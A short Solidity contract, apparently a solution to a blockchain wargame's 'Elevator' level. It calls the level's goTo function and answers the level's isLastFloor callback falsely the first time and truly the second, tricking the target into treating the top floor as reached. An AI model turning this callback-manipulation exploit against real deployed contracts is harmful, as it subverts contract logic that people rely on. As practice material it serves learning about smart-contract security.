// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract ElevatorHackDan {
    
    address levelAddress;
    bool alreadyEntered;

    constructor(address _levelAddress) {
        levelAddress = _levelAddress;
    }

    function pwn() external {
        bytes4 selector = bytes4(bytes32(keccak256("goTo(uint256)")));
        bytes memory data = abi.encodeWithSelector(selector, 0);
        (bool success, ) = levelAddress.call(data);
        require (success, "Function call failed");
    }

    function isLastFloor(uint256) external returns(bool) {
        if (!(alreadyEntered)) {
            alreadyEntered = true;
            return false;
        }
        else {
            return true;
        }
    }
}